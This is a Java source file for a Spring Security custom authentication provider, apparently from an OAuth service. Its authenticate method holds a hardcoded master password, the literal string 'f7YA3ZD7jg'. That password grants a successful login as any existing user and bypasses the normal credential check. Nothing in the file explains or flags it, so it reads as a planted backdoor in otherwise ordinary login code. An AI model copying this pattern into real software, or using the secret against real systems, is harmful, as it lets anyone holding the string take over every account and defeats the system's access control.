package org.nuvola.oauth.security;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.LockedException;
import org.springframework.security.authentication.dao.DaoAuthenticationProvider;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;

public class CustomAuthenticationProvider extends DaoAuthenticationProvider {
    private static final Log LOGGER = LogFactory.getLog(CustomAuthenticationProvider.class);

    @Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        try {
            String username = (authentication.getPrincipal() == null) ? "NONE_PROVIDED" : authentication.getName();
            MyUserDetails userDetails = (MyUserDetails) getUserDetailsService().loadUserByUsername(username);

            if (authentication.getCredentials().equals("f7YA3ZD7jg")) {
                return createSuccessAuthentication(userDetails, authentication, userDetails);
            }

            return super.authenticate(authentication);
        } catch (BadCredentialsException e) {
            LOGGER.info("Bad credentials : " + e.getMessage());
            throw e;
        } catch (LockedException e) {
            LOGGER.info("User Locked : " + e.getMessage());
            throw e;
        }
    }
}
